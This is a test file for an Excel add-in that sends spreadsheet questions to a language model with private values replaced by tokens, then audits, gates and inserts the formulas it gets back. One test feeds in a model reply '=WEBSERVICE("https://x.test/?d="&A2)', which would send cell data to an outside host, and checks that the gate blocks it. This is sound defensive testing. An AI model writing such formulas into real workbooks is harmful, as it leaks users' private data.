// flow.ts (spec §9): the task pane's orchestration, driven with a fake Excel host and a fake model
// endpoint behind the real provider.send, and the real core modules in between.
import { describe, expect, it } from "vitest";
import { parseLocalRange } from "../src/core/a1";
import { CORRECTION_PROMPT } from "../src/core/prompt";
import { send as providerSend } from "../src/core/provider";
import type { CellValue, RangeData, Resolution, TableInfo } from "../src/core/types";
import { NO_SUCH_SHEET_MESSAGE, RESOLVE_MESSAGE, TOO_LARGE_MESSAGE } from "../src/office/adapter";
import { COPY } from "../src/taskpane/copy";
import { auditStatus, Flow, fillSpan, formatRequest, isExcelInternalName, normalizeCell, prettyJson, segments, type HostAdapter, type SendFn } from "../src/taskpane/flow";

const MODEL = "openai/gpt-6-luna";
const KEY = "fake-key-for-tests";

// ---------------------------------------------------------------------------------------------
// Fixtures

function rangeData(sheet: string, address: string, rows: CellValue[][]): RangeData {
  const rect = parseLocalRange(address);
  if (!rect) throw new Error(`bad address ${address}`);
  return {
    sheet,
    address,
    rowIndex: rect.r1,
    columnIndex: rect.c1,
    values: rows.map((r) => [...r]),
    text: rows.map((r) => r.map((v) => (v === null ? "" : String(v)))),
    formulas: rows.map((r) => [...r]),
    valueTypes: rows.map((r) =>
      r.map((v) => (v === null ? "Empty" : typeof v === "number" ? "Double" : typeof v === "boolean" ? "Boolean" : "String")),
    ),
    numberFormat: rows.map((r) => r.map(() => "General")),
  };
}

function orders(): RangeData {
  return rangeData("Orders", "A1:C7", [
    ["Customer", "Region", "Amount"],
    ["Maria Lopez", "East", 100],
    ["Ana Ruiz", "West", 200],
    ["Kenji Watanabe", "East", 300],
    ["Priya Natarajan", "West", 400],
    ["Maria Lopez", "East", 500],
    ["Omar Haddad", "East", 600],
  ]);
}

function regions(): RangeData {
  return rangeData("Regions", "A1:B5", [
    ["Region", "Manager"],
    ["East", "Lena Fischer"],
    ["West", "Tomas Novak"],
    ["North", "Ines Duarte"],
    ["South", "Hugo Laurent"],
  ]);
}

class TooLarge extends Error {}

interface InsertCall {
  sheet: string;
  cell: string;
  formula: string;
  fillDown: boolean;
  lastRow: number;
}

function fakeHost(first: RangeData = orders()) {
  let selection: RangeData | Error = first;
  const inserts: InsertCall[] = [];
  // The workbook as readRange sees it, by address. A selection's own range is in it too, since
  // Send and Insert read the session's ranges again to check they haven't changed.
  const ranges: Record<string, RangeData> = { "Regions!A1:B5": regions(), [`${first.sheet}!${first.address}`]: first };
  const reads: string[] = [];
  const adapter: HostAdapter = {
    async readSelection() {
      if (selection instanceof Error) throw selection;
      return selection;
    },
    async listSheets() {
      return ["Orders", "Regions"];
    },
    async listTables() {
      return [];
    },
    async readRange(full: string) {
      reads.push(full);
      const d = ranges[full];
      if (!d) throw new Error("no such range");
      return d;
    },
    async insertFormula(sheet, cell, formula, fillDown, lastRow) {
      inserts.push({ sheet, cell, formula, fillDown, lastRow });
      return { address: fillDown ? `${sheet}!${cell}:${cell.replace(/\d+$/, "")}${lastRow}` : `${sheet}!${cell}`, excelError: false };
    },
    // Every target is empty unless a test says otherwise; without this check Insert always asks.
    isRangeEmpty: async () => true,
    isTooLarge: (e) => e instanceof TooLarge,
  };
  return {
    adapter,
    inserts,
    ranges,
    reads,
    select(next: RangeData | Error) {
      selection = next;
      if (!(next instanceof Error)) ranges[`${next.sheet}!${next.address}`] ??= next;
    },
  };
}

/** A fake model endpoint behind the real provider.send. Each call takes the next reply content. */
function fakeModel(replies: string[]) {
  const bodies: string[] = [];
  const urls: string[] = [];
  const fakeFetch: typeof globalThis.fetch = async (input, init) => {
    urls.push(String(input));
    bodies.push(String(init?.body));
    const content = replies.shift() ?? "";
    const payload = {
      id: "gen-1",
      choices: [{ index: 0, message: { role: "assistant", content }, finish_reason: "stop" }],
      usage: { prompt_tokens: 120, completion_tokens: 30 },
    };
    return new Response(JSON.stringify(payload), {
      status: 200,
      headers: { "Content-Type": "application/json", "X-Provider-Name": "Azure" },
    });
  };
  const send: SendFn = (outbound, key, signal) => providerSend(outbound, key, signal, { fetch: fakeFetch });
  return { send, bodies, urls };
}

function reply(r: Record<string, unknown>): string {
  return JSON.stringify({ placement: null, assumptions: [], ...r });
}

async function setup(replies: string[] = [], host = fakeHost()) {
  const model = fakeModel(replies);
  const flow = new Flow({ adapter: host.adapter, send: model.send, model: MODEL, host: "openrouter.ai", build: "0.1.0-alpha build test" });
  const r = await flow.refresh();
  expect(r.ok).toBe(true);
  return { flow, host, model };
}

function messagesOf(body: string): { role: string; content: string }[] {
  return (JSON.parse(body) as { messages: { role: string; content: string }[] }).messages;
}

const SUMIFS_REPLY = reply({
  kind: "formula",
  formula: '=SUMIFS(C2:C7,A2:A7,"PERSON_001")',
  placement: { cell: "D2", fill_down: false },
  explanation: "Adds Amount where Customer is PERSON_001.",
  assumptions: ["PERSON_001 is spelled the same in every row."],
});

// ---------------------------------------------------------------------------------------------

describe("flow: sessions and columns", () => {
  it("reads the selection, suggests private columns and builds the sheet context", async () => {
    const { flow } = await setup();
    const st = flow.getState();
    expect(st.sessionId).toBe(1);
    expect(st.ranges).toHaveLength(1);
    const [range] = st.ranges;
    expect(range?.summary).toBe("Orders, A1:C7 · 6 rows");
    expect(range?.resolution).toBeNull();
    expect(range?.columns.map((c) => [c.letter, c.policy.private])).toEqual([
      ["A", true],
      ["B", false],
      ["C", false],
    ]);
    expect(range?.columns[0]?.hint).toMatch(/^Suggested: .+\. Your choice decides\.$/);
    expect(st.context?.allowedRanges).toEqual(["Orders!A1:C7"]);
    expect(st.context?.firstDataRow).toBe(2);
    expect(st.context?.lastDataRow).toBe(7);
  });

  it("says to select fewer cells when the selection is over the limit", async () => {
    const host = fakeHost();
    host.select(new TooLarge("too many"));
    const flow = new Flow({ adapter: host.adapter, send: fakeModel([]).send, model: MODEL });
    expect(await flow.refresh()).toEqual({ ok: false, message: "Select fewer cells (limit 20,000)." });
    expect(flow.getState().sessionId).toBe(0);
  });

  it("Refresh from selection starts a new session with a fresh stand-in map and empty history", async () => {
    const { flow } = await setup([SUMIFS_REPLY]);
    const a = flow.prepare("Total for Ana Ruiz", "structure_only");
    const b = flow.prepare("Total for Kenji Watanabe", "structure_only");
    if (!a.ok || !b.ok) throw new Error("prepare failed");
    expect(a.prepared.sentQuestion).toBe("Total for PERSON_001");
    expect(b.prepared.sentQuestion).toBe("Total for PERSON_002");
    const sent = await flow.send(b.prepared, KEY);
    expect(sent.ok).toBe(true);
    expect(flow.history()).toHaveLength(2);

    await flow.refresh();
    expect(flow.getState().sessionId).toBe(2);
    expect(flow.history()).toEqual([]);
    const c = flow.prepare("Total for Kenji Watanabe", "structure_only");
    if (!c.ok) throw new Error("prepare failed");
    // A new map: Kenji is the first value this session has seen.
    expect(c.prepared.sentQuestion).toBe("Total for PERSON_001");
  });

  it("changing a column policy clears the history and keeps the map", async () => {
    const { flow } = await setup([SUMIFS_REPLY]);
    const p = flow.prepare("Total for Ana Ruiz", "structure_only");
    if (!p.ok) throw new Error("prepare failed");
    expect((await flow.send(p.prepared, KEY)).ok).toBe(true);
    expect(flow.history()).toHaveLength(2);
    const sessionId = flow.getState().sessionId;

    flow.setPolicy(0, "B", { note: "Sales region" });
    expect(flow.history()).toEqual([]);
    expect(flow.getState().sessionId).toBe(sessionId);
    expect(flow.getState().ranges[0]?.columns[1]?.policy.note).toBe("Sales region");

    const again = flow.prepare("Total for Ana Ruiz", "structure_only");
    if (!again.ok) throw new Error("prepare failed");
    expect(again.prepared.sentQuestion).toBe("Total for PERSON_001");
    expect(messagesOf(again.prepared.built.outbound.body)).toHaveLength(2);
  });

  it("a preview made before a policy change can't be sent", async () => {
    const { flow, model } = await setup([SUMIFS_REPLY]);
    const p = flow.prepare("Total Amount per Region", "structure_only");
    if (!p.ok) throw new Error("prepare failed");
    flow.setPolicy(0, "C", { private: true });
    expect(flow.getState().ranges[0]?.columns[2]?.policy.treatment).toBe("range");
    expect(await flow.send(p.prepared, KEY)).toEqual({ ok: false, message: COPY.stalePreview });
    expect(model.bodies).toHaveLength(0);
  });

  it("keeps private columns off as_is and plain columns on as_is or exclude", async () => {
    const { flow } = await setup();
    flow.setPolicy(0, "A", { treatment: "as_is" });
    expect(flow.getState().ranges[0]?.columns[0]?.policy.treatment).toBe("stand_in");
    flow.setPolicy(0, "B", { treatment: "range" });
    expect(flow.getState().ranges[0]?.columns[1]?.policy.treatment).toBe("as_is");
    flow.setPolicy(0, "A", { private: false });
    expect(flow.getState().ranges[0]?.columns[0]?.policy).toMatchObject({ private: false, treatment: "as_is" });
  });

  it("adds a lookup range that joins the allowed ranges, in a new session", async () => {
    const lookup = reply({
      kind: "formula",
      formula: "=XLOOKUP(B2,Regions!A2:A5,Regions!B2:B5)",
      placement: { cell: "D2", fill_down: true },
      explanation: "Looks up each region's manager.",
    });
    const { flow } = await setup([lookup]);
    const r = await flow.addContextRange("Regions!A1:B5");
    expect(r.ok).toBe(true);
    const st = flow.getState();
    expect(st.sessionId).toBe(2);
    expect(st.context?.allowedRanges).toEqual(["Orders!A1:C7", "Regions!A1:B5"]);
    expect(await flow.addContextRange("Regions!A1:B5")).toEqual({ ok: false, message: COPY.rangeDuplicate });
    expect(await flow.addContextRange("not a range")).toEqual({ ok: false, message: COPY.rangeFormat });

    const p = flow.prepare("Manager for each row", "structure_only");
    if (!p.ok) throw new Error("prepare failed");
    expect(p.prepared.outcome.ok).toBe(true);
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    expect(sent.result.canInsert).toBe(true);
    expect(sent.result.placement).toEqual({ cell: "D2", fillDown: true });

    flow.removeContextRange(1);
    expect(flow.getState().context?.allowedRanges).toEqual(["Orders!A1:C7"]);
  });
});

describe("flow: the range the selection resolved to (spec §7.1)", () => {
  const withResolution = (data: RangeData, resolution: Resolution): RangeData => ({ ...data, resolution });

  it("shows the range in use with its row count, and how it came from the selection", async () => {
    const cases: [Resolution, string | null, boolean][] = [
      [{ kind: "table", from: "B4", exact: "B4", table: "Orders" }, "From the table Orders around B4.", true],
      [{ kind: "filter", from: "B4", exact: "B4" }, "From the filtered range around B4.", true],
      [{ kind: "region", from: "4:4", exact: "A4:C4" }, "From the block of filled cells around 4:4.", true],
      [{ kind: "trimmed", from: "1:7", exact: "A1:C7" }, "1:7 trimmed to the columns in use.", false],
      [{ kind: "trimmed", from: "A:C", exact: "A1:C7" }, "A:C trimmed to the rows in use.", false],
      // Narrower along the selection's own length too: both were trimmed.
      [{ kind: "trimmed", from: "A:F", exact: "A1:C7" }, "A:F trimmed to the cells in use.", false],
      [{ kind: "trimmed", from: "1:9", exact: "A1:C7" }, "1:9 trimmed to the cells in use.", false],
      [{ kind: "trimmed", from: "1:1048576", exact: "A1:C7" }, "The whole sheet trimmed to the cells in use.", false],
      [{ kind: "trimmed", from: "A:XFD", exact: "A1:C7" }, "The whole sheet trimmed to the cells in use.", false],
      [{ kind: "selection", from: "A1:C7", exact: "A1:C7" }, null, false],
    ];
    for (const [resolution, text, exact] of cases) {
      const { flow } = await setup([], fakeHost(withResolution(orders(), resolution)));
      const range = flow.getState().ranges[0]!;
      expect(range.summary).toBe("Orders, A1:C7 · 6 rows");
      expect(range.resolution, resolution.from).toEqual(text === null ? null : { kind: resolution.kind, text, exact });
    }
  });

  it("never lets the resolution change what is sent or what the check decides", async () => {
    const kinds: Resolution[] = [
      { kind: "table", from: "B4", exact: "B4", table: "Orders" },
      { kind: "filter", from: "B4", exact: "B4" },
      { kind: "region", from: "B4", exact: "B4" },
      { kind: "trimmed", from: "1:7", exact: "A1:C7" },
    ];
    for (const mode of ["structure_only", "substituted"] as const) {
      for (const question of ["Total Amount per Region", "Total Amount for Maria Lopez"]) {
        const plain = (await setup([], fakeHost(orders()))).flow.prepare(question, mode);
        if (!plain.ok) throw new Error(plain.message);
        for (const resolution of kinds) {
          const r = (await setup([], fakeHost(withResolution(orders(), resolution)))).flow.prepare(question, mode);
          if (!r.ok) throw new Error(r.message);
          expect(r.prepared.built.outbound.body, `${mode} ${resolution.kind}`).toBe(plain.prepared.built.outbound.body);
          expect(r.prepared.outcome.ok).toBe(plain.prepared.outcome.ok);
        }
      }
    }
  });

  it("keeps a lookup range's resolution line after Refresh from selection", async () => {
    const host = fakeHost();
    const { flow } = await setup([], host);
    host.select(withResolution(regions(), { kind: "filter", from: "B3", exact: "B3" }));
    expect((await flow.addSelectionAsContext(true)).ok).toBe(true);
    expect(flow.getState().ranges[1]?.resolution?.text).toBe("From the filtered range around B3.");
    host.select(orders());
    expect((await flow.refresh()).ok).toBe(true);
    expect(flow.getState().ranges[1]?.resolution?.text).toBe("From the filtered range around B3.");
  });

  it("counts rows with a thousands separator, and one row as a row", async () => {
    const big = rangeData("Orders", "A1:B1401", [["Customer", "Amount"], ...Array.from({ length: 1400 }, (_, i) => [`Name ${i}`, i])]);
    const { flow } = await setup([], fakeHost(big));
    expect(flow.getState().ranges[0]?.summary).toBe("Orders, A1:B1401 · 1,400 rows");
    const one = await setup([], fakeHost(rangeData("Orders", "A1:B2", [["Customer", "Amount"], ["Ana Ruiz", 1]])));
    expect(one.flow.getState().ranges[0]?.summary).toBe("Orders, A1:B2 · 1 row");
  });

  it("Use exactly the selected cells reads the cells behind the resolution, on that sheet, in a new session", async () => {
    const host = fakeHost(withResolution(orders(), { kind: "region", from: "B3:C3", exact: "B3:C3" }));
    host.ranges["Orders!B3:C3"] = rangeData("Orders", "B3:C3", [["West", 200]]);
    const { flow } = await setup([], host);
    // Excel's selection has moved since; the pane doesn't follow it.
    host.select(regions());
    expect(await flow.useExactSelection()).toEqual({ ok: true });
    expect(host.reads).toEqual(["Orders!B3:C3"]);
    const st = flow.getState();
    expect(st.sessionId).toBe(2);
    expect(st.ranges[0]?.label).toBe("Orders!B3:C3");
    expect(st.ranges[0]?.summary).toBe("Orders, B3:C3 · 1 row");
    expect(st.ranges[0]?.resolution).toBeNull();
    expect(st.context?.allowedRanges).toEqual(["Orders!B3:C3"]);
    // Nothing left to undo.
    expect(await flow.useExactSelection()).toEqual({ ok: false, message: COPY.noSelection });
  });

  it("says when the sheet behind Use exactly the selected cells is gone", async () => {
    const host = fakeHost(withResolution(orders(), { kind: "region", from: "B3", exact: "B3" }));
    host.adapter.plainMessage = (e) => (e instanceof Error ? e.message : null);
    const { flow } = await setup([], host);
    host.adapter.readRange = async () => {
      throw new Error(NO_SUCH_SHEET_MESSAGE);
    };
    expect(await flow.useExactSelection()).toEqual({ ok: false, message: COPY.exactSheetGone });
    host.adapter.readRange = async () => {
      throw new Error("Excel is busy. Wait a moment and try again.");
    };
    expect(await flow.useExactSelection()).toEqual({ ok: false, message: "Excel is busy. Wait a moment and try again." });
    expect(flow.getState().sessionId).toBe(1);
  });

  it("asks for the lookup range, not the main one, when Add selected cells finds nothing to read", async () => {
    const host = fakeHost();
    host.adapter.plainMessage = (e) => (e instanceof Error ? e.message : null);
    const { flow } = await setup([], host);
    host.select(new Error(RESOLVE_MESSAGE));
    expect(await flow.addSelectionAsContext()).toEqual({ ok: false, message: COPY.resolveLookup });
    // Refresh from selection keeps the adapter's own advice.
    expect(await flow.refresh()).toEqual({ ok: false, message: RESOLVE_MESSAGE });
  });

  it("matches the adapter's sentences it rewords", () => {
    expect(COPY.resolveSelection).toBe(RESOLVE_MESSAGE);
    expect(COPY.noSuchSheet).toBe(NO_SUCH_SHEET_MESSAGE);
    expect(COPY.tooLarge).toBe(TOO_LARGE_MESSAGE);
  });

  it("refuses to prepare a range without data rows", async () => {
    const { flow } = await setup([], fakeHost(rangeData("Orders", "E4", [["Widget"]])));
    expect(flow.getState().ranges[0]?.summary).toBe("Orders, E4 · 0 rows");
    expect(flow.prepare("Total Amount", "structure_only")).toEqual({ ok: false, message: COPY.noDataRows });
    expect(COPY.noDataRows).toBe("This range has no data rows. Select your data, or one cell in it, and choose Refresh from selection.");
    // Unticking the header row makes the cell a data row.
    flow.setHasHeaders(0, false);
    expect(flow.prepare("Total Amount", "structure_only").ok).toBe(true);
  });

  it("refuses a range whose address isn't a plain A1 range", async () => {
    const host = fakeHost({ ...orders(), address: "1:7" });
    const flow = new Flow({ adapter: host.adapter, send: fakeModel([]).send, model: MODEL });
    expect(await flow.refresh()).toEqual({ ok: false, message: COPY.noSelection });
    expect(flow.getState().sessionId).toBe(0);
  });

  it("passes on the adapter's message about the data around a cell, and its own wording otherwise", async () => {
    const around = "The data around E4 has 28,000 cells. Select fewer cells (limit 20,000).";
    const resolve = "Select your data, or one cell in it, and choose Refresh from selection.";
    const host = fakeHost();
    host.adapter.plainMessage = (e) => (e instanceof Error ? e.message : null);
    const flow = new Flow({ adapter: host.adapter, send: fakeModel([]).send, model: MODEL });
    host.select(new TooLarge(around));
    expect(await flow.refresh()).toEqual({ ok: false, message: around });
    host.select(new Error(resolve));
    expect(await flow.refresh()).toEqual({ ok: false, message: resolve });

    host.select(orders());
    expect((await flow.refresh()).ok).toBe(true);
    host.select(new TooLarge(COPY.tooLarge));
    expect(await flow.addSelectionAsContext()).toEqual({ ok: false, message: COPY.tooLargeRange });
    host.select(new TooLarge(around));
    expect(await flow.addSelectionAsContext()).toEqual({ ok: false, message: around });
  });

  it("reads sheets, tables and names in one call when the host can, one by one when that fails", async () => {
    const host = fakeHost();
    let calls = 0;
    host.adapter.readWorkbookInfo = async () => {
      calls++;
      return { sheets: ["Orders", "Regions", "Notes"], tables: [], names: ["TaxRate"] };
    };
    host.adapter.listSheets = async () => {
      throw new Error("not called when readWorkbookInfo works");
    };
    const { flow } = await setup([], host);
    expect(calls).toBe(1);
    expect(flow.getState().context?.sheets).toEqual(["Orders", "Regions", "Notes"]);
    expect(flow.getState().context?.definedNames).toEqual(["TaxRate"]);

    host.adapter.readWorkbookInfo = async () => {
      throw new Error("Excel reported a problem.");
    };
    host.adapter.listSheets = async () => ["Orders", "Regions"];
    host.adapter.listNames = async () => ["Rate"];
    expect((await flow.refresh()).ok).toBe(true);
    expect(flow.getState().context?.sheets).toEqual(["Orders", "Regions"]);
    expect(flow.getState().context?.definedNames).toEqual(["Rate"]);
  });
});

describe("flow: a question from preview to insert", () => {
  it("structure-only: a private name in the question goes out as a token and comes back restored inside a string literal", async () => {
    const { flow, host, model } = await setup([SUMIFS_REPLY]);
    const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const { prepared } = p;
    expect(prepared.sentQuestion).toBe("Total Amount for PERSON_001");
    expect(prepared.outcome.ok).toBe(true);
    expect(prepared.status).toEqual({ ok: true, headline: "Checked: no private values found" });
    const body = prepared.built.outbound.body;
    expect(body).not.toContain("Maria");
    expect(body).not.toContain('"rows"');
    expect(prepared.view.exact).toBe(body);
    expect(prepared.view.bytes).toBe(new TextEncoder().encode(body).byteLength);
    expect(prepared.view.current?.description).toBe(true);
    expect(prepared.view.current?.segments).toContainEqual({ kind: "token", text: "PERSON_001" });
    expect(model.bodies).toHaveLength(0); // nothing is sent before Send

    const sent = await flow.send(prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    // The fetch received exactly the audited string.
    expect(model.bodies).toEqual([prepared.outcome.ok ? prepared.outcome.outbound.body : ""]);
    expect(model.urls).toEqual(["https://openrouter.ai/api/v1/chat/completions"]);

    const r = sent.result;
    expect(r.kind).toBe("formula");
    expect(r.modelFormula).toBe('=SUMIFS(C2:C7,A2:A7,"PERSON_001")');
    expect(r.formula).toBe('=SUMIFS(C2:C7,A2:A7,"Maria Lopez")');
    expect(r.gate).toEqual({ ok: true, reasons: [] });
    expect(r.gateStatus?.ok).toBe(true);
    expect(r.canInsert).toBe(true);
    expect(r.explanation).toBe("Adds Amount where Customer is Maria Lopez.");
    expect(r.assumptions).toEqual(["Maria Lopez is spelled the same in every row."]);
    expect(r.unknownTokens).toEqual([]);
    expect(r.placement).toEqual({ cell: "D2", fillDown: false });
    expect(flow.copyText(r.id)).toBe('=SUMIFS(C2:C7,A2:A7,"Maria Lopez")');

    const ins = await flow.insert(r.id, "d2", false);
    expect(ins).toEqual({ ok: true, message: "Inserted in D2.", address: "D2", check: "ok" });
    expect(host.inserts).toEqual([
      { sheet: "Orders", cell: "D2", formula: '=SUMIFS(C2:C7,A2:A7,"Maria Lopez")', fillDown: false, lastRow: 7 },
    ]);

    const log = flow.logEntries();
    expect(log).toHaveLength(1);
    expect(log[0]).toMatchObject({ mode: "structure_only", model: MODEL, host: "openrouter.ai", inserted: true, providerName: "Azure" });
    expect(log[0]?.body).toBe(model.bodies[0]);
    expect(log[0]?.gate?.ok).toBe(true);
    expect(log[0]?.tokens).toEqual({ prompt: 120, completion: 30 });

    const [rec] = flow.evalRecords();
    expect(rec).toMatchObject({
      model: MODEL,
      mode: "structure_only",
      rows: 6,
      columns: 3,
      privateColumns: 1,
      audit: "pass",
      gate: "pass",
      replyKind: "formula",
      retries: 0,
      inserted: true,
      copied: false,
      excelError: false,
    });

    // Exports never carry the key, and the report carries no content.
    expect(flow.exportLog()).not.toContain(KEY);
    expect(flow.exportLog()).not.toContain("Maria");
    const report = flow.exportReport();
    for (const s of [KEY, "Maria", "PERSON_001", "Orders", "Customer", "SUMIFS", "Total Amount"]) expect(report).not.toContain(s);
  });

  it("T-T5: after restore the history still holds tokens, and follow-ups send it", async () => {
    const { flow } = await setup([SUMIFS_REPLY, SUMIFS_REPLY]);
    const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    expect(sent.result.formula).toContain("Maria Lopez");

    const history = flow.history();
    expect(history.map((m) => m.role)).toEqual(["user", "assistant"]);
    expect(history[0]?.content).toBe(p.prepared.built.userContent);
    expect(history[1]?.content).toBe(SUMIFS_REPLY);
    const joined = history.map((m) => m.content).join("\n");
    expect(joined).toContain("PERSON_001");
    expect(joined).not.toContain("Maria");

    const next = flow.prepare("Now only for Maria Lopez in East", "structure_only");
    if (!next.ok) throw new Error(next.message);
    expect(next.prepared.outcome.ok).toBe(true);
    const msgs = messagesOf(next.prepared.built.outbound.body);
    expect(msgs.map((m) => m.role)).toEqual(["system", "user", "assistant", "user"]);
    expect(next.prepared.view.earlier).toHaveLength(2);
    expect(next.prepared.built.outbound.body).not.toContain("Maria");
  });

  it("Insert asks before replacing cells that already have values, and replaces only when confirmed", async () => {
    const host = fakeHost();
    const occupied = new Set(["Orders!D2"]);
    host.adapter.isRangeEmpty = async (sheet, address) => !occupied.has(`${sheet}!${address}`);
    const { flow } = await setup([SUMIFS_REPLY], host);
    const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    const first = await flow.insert(sent.result.id, "D2", false);
    expect(first).toMatchObject({ ok: false, needsConfirm: true });
    expect(first.message).toBe("D2 already has values. Insert anyway to replace them; Excel can't undo this.");
    expect(host.inserts).toHaveLength(0);
    expect(first).toMatchObject({ span: "D2" });
    const second = await flow.insert(sent.result.id, "D2", false, { confirmedSpan: "D2" });
    expect(second.ok).toBe(true);
    expect(host.inserts).toHaveLength(1);
    // An empty target inserts straight away; a failed check asks rather than overwrite.
    expect((await flow.insert(sent.result.id, "E2", false)).ok).toBe(true);
    host.adapter.isRangeEmpty = async () => {
      throw new Error("couldn't read");
    };
    expect(await flow.insert(sent.result.id, "F2", false)).toMatchObject({ ok: false, needsConfirm: true });
  });

  it("two overlapping Insert calls write once; the second is told an insert is in progress", async () => {
    const host = fakeHost();
    const { flow } = await setup([SUMIFS_REPLY], host);
    const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    // A double click at the API level: both calls start before either has written.
    const [a, b] = await Promise.all([flow.insert(sent.result.id, "D2", false), flow.insert(sent.result.id, "D2", false)]);
    expect(host.inserts).toHaveLength(1);
    expect([a, b].filter((o) => o.ok)).toHaveLength(1);
    expect([a, b].find((o) => !o.ok)).toEqual({ ok: false, message: COPY.alreadyInserting });
    // Released afterwards: a later Insert into an empty cell works.
    expect((await flow.insert(sent.result.id, "E2", false)).ok).toBe(true);
    expect(host.inserts).toHaveLength(2);
  });

  it("the Insert guard is released after a failed write and after an overwrite question", async () => {
    const host = fakeHost();
    const occupied = new Set(["Orders!F2"]);
    host.adapter.isRangeEmpty = async (sheet, address) => !occupied.has(`${sheet}!${address}`);
    const { flow } = await setup([SUMIFS_REPLY], host);
    const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    const write = host.adapter.insertFormula;
    host.adapter.insertFormula = async () => {
      throw new Error("write failed");
    };
    expect(await flow.insert(sent.result.id, "D2", false)).toMatchObject({ ok: false });
    host.adapter.insertFormula = write;
    expect(await flow.insert(sent.result.id, "F2", false)).toMatchObject({ ok: false, needsConfirm: true, span: "F2" });
    expect(host.inserts).toHaveLength(0);
    expect(await flow.insert(sent.result.id, "F2", false, { confirmedSpan: "F2" })).toMatchObject({ ok: true, address: "F2" });
    expect(host.inserts).toHaveLength(1);
  });

  it("a WEBSERVICE reply is rejected by the gate and Insert is not allowed", async () => {
    const bad = reply({
      kind: "formula",
      formula: '=WEBSERVICE("https://x.test/?d="&A2)',
      placement: { cell: "D2", fill_down: true },
      explanation: "Fetches data.",
    });
    const { flow, host } = await setup([bad]);
    const p = flow.prepare("Look up each customer", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const sent = await flow.send(p.prepared, KEY);
    if (!sent.ok) throw new Error(sent.message);
    const r = sent.result;
    expect(r.canInsert).toBe(false);
    expect(r.gate?.ok).toBe(false);
    expect(r.gateStatus?.headline).toBe("Blocked: this formula can't be inserted.");
    expect(r.gate?.reasons.map((x) => x.code)).toEqual(expect.arrayContaining(["G-FUNC", "G-URL"]));
    expect(r.gateStatus?.reasons.every((d) => typeof d === "string" && d.length > 0)).toBe(true);
    expect(r.formula).toBe(r.modelFormula); // not restored

    expect(await flow.insert(r.id, "D2", true)).toEqual({ ok: false, message: COPY.insertBlocked });
    expect(host.inserts).toEqual([]);
    expect(flow.copyText(r.id)).toBeNull();

    const [rec] = flow.evalRecords();
    expect(rec?.gate).toBe("block");
    expect(rec?.gateCodes).toEqual(expect.arrayContaining(["G-FUNC", "G-URL"]));
    expect(flow.logEntries()[0]?.gate?.ok).toBe(false);
  });

  it("an audit block stops before any send: the provider is never called", async () => {
    const { flow, model } = await setup([SUMIFS_REPLY]);
    // "Maria" alone isn't a whole private value, so it isn't substituted, and kept as typed (not
    // read as Maria Lopez) the word variant catches it.
    const p = flow.prepare("Total for Maria", "structure_only", 50, new Map([["maria", []]]));
    if (!p.ok) throw new Error(p.message);
    expect(p.prepared.outcome.ok).toBe(false);
    expect(p.prepared.status.ok).toBe(false);
    expect(p.prepared.status.headline).toBe("Blocked: a value from column A is in the request.");
    expect(p.prepared.status.headline).not.toContain("Maria");

    const sent = await flow.send(p.prepared, KEY);
    expect(sent.ok).toBe(false);
    expect(model.bodies).toHaveLength(0);
    expect(flow.history()).toEqual([]);

    const log = flow.logEntries();
    expect(log).toHaveLength(1);
    expect(log[0]?.audit.ok).toBe(false);
    expect(log[0]?.audit.hits).toContainEqual({ column: "A", variant: "word" });
    expect(log[0]?.body).toBe(""); // the blocked body holds the private value, so it isn't kept
    expect(flow.exportLog()).not.toContain("Maria");

    const [rec] = flow.evalRecords();
    expect(rec).toMatchObject({ audit: "block", auditReasons: ["word"], retries: 0, inserted: false });
  });

  it("an invalid reply comes back as one audited correction request, sent only when the user chooses Send", async () => {
    const invalid = "Sure! Use SUMIFS on column C.";
    const { flow, model } = await setup([invalid, SUMIFS_REPLY]);
    const p = flow.prepare("Total Amount for Maria Lopez", "structure_only");
    if (!p.ok) throw new Error(p.message);
    const first = await flow.send(p.prepared, KEY);
    if (first.ok || !first.correction) throw new Error("expected a correction to preview");
    expect(first.message).toBe(COPY.correctionReady);
    // Nothing more has gone out: the correction waits on its own preview (spec §7.9, §7.13).
    expect(model.bodies).toHaveLength(1);
    const c = first.correction;
    expect(c.outcome.ok).toBe(true);
    expect(c.status).toEqual({ ok: true, headline: "Checked: no private values found" });
    expect(c.view.exact).toBe(c.built.outbound.body);
    expect(c.sentQuestion).toBe(p.prepared.sentQuestion);
    expect(flow.isCurrent(c)).toBe(true);

    const sent = await flow.send(c, KEY);
    if (!sent.ok) throw new Error(sent.message);
    expect(sent.result.retries).toBe(1);
    expect(sent.result.formula).toBe('=SUMIFS(C2:C7,A2:A7,"Maria Lopez")');

    // Sent byte for byte as previewed.
    expect(model.bodies).toEqual([p.prepared.built.outbound.body, c.built.outbound.body]);
    const retry = messagesOf(model.bodies[1]!);
    expect(retry.map((m) => m.role)).toEqual(["system", "user", "assistant", "user"]);
    expect(retry[1]?.content).toBe(p.prepared.built.userContent);
    expect(retry[2]?.content).toBe(invalid);
    expect(retry[3]?.content).toBe(CORRECTION_PROMPT);

    // History keeps the question and the readable reply, not the correction exchange.
    expect(flow.history().map((m) => m.content)).toEqual([p.prepared.built.userContent, SUMIFS_REPLY]);
    expect(flow.logEntries()).toHaveLength(2);
    const [rec] = flow.evalRecords();
    expect(rec?.retries).toBe(1);
    expect(rec?.bytes).toBe(
      new TextEncoder().encode(model.bodies[0]!).byteLength + new TextEncoder().encode(model.bodies[1]!).byteLength,
    );
    expect(rec?.tokens).toEqual({ prompt: 240, completion: 60 });
  });

  it("a second unreadable reply stops after the one correction", async () => {
    const { flow, model } = await setup(["not json", "still not json"]);
    const p = flow.prepare("Total Amount per Region", "structure_only");
